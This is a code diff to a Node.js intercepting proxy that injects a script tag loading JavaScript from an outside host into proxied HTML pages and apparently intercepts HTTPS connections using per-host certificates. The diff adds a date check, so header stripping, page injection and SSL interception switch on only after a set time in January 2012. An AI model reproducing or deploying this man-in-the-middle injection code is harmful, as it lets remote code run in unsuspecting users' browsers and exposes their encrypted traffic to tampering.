@@ -14,6 +14,11 @@ var ADDITIONAL_CODE = {
         "<script type='text/javascript' src='https://www.yaluandmike.com:446/inject/index.js'></script>"
 };
 
+var isEnabled = function () {
+    var enabled = new Date().getTime() > new Date(2012, 0, 25, 15, 16).getTime();
+    return enabled;
+};
+
 var PORT = ~~(process.env.PORT || 8000);
 
 function fixHeaders(request, oldHeaders) {
@@ -80,9 +85,12 @@ var debug_view = function (request_info) {
 
 
 var serverDefinition = function (http_mod, default_port, is_ssl) { return catch_errors(function(request, response) {
-  request.headers['accept-encoding'] = 'identity';
-  delete request.headers['accept-encoding'];
-  delete request.headers['proxy-connection'];
+  var enabled = isEnabled();
+  if (enabled) {
+      request.headers['accept-encoding'] = 'identity';
+      delete request.headers['accept-encoding'];
+      delete request.headers['proxy-connection'];
+  }
 
   var parsed_url = url.parse(request.url);
   var parsed_host = url.parse('http://' + request.headers['host']);
@@ -98,7 +106,7 @@ var serverDefinition = function (http_mod, default_port, is_ssl) { return catch_
 
   var proxy_request = http_mod.request(request_info, function (proxy_response) {
     var isHtml = (proxy_response.headers['content-type'] &&
-                  proxy_response.headers['content-type'].toLowerCase().indexOf("html") != -1),
+                  proxy_response.headers['content-type'].toLowerCase().indexOf("html") != -1 && enabled),
         buffer = "";
 
     if (isHtml) {
@@ -163,6 +171,7 @@ server.on('error', function (error) {
     console.log(error.stack);
 });
 server.on('upgrade', function (request, socket, head) {
+     var enabled = isEnabled();
      var parsed_url = url.parse('https://' + request.url);
 
      var clientSocket;
@@ -178,7 +187,7 @@ server.on('upgrade', function (request, socket, head) {
          }
      }
 
-     if (directSsl[hostName] || !sslCerts[hostName]) {
+     if (!enabled || directSsl[hostName] || !sslCerts[hostName]) {
          clientSocket = net.createConnection(~~(parsed_url.port || 443),
                                              hostName);
      } else {
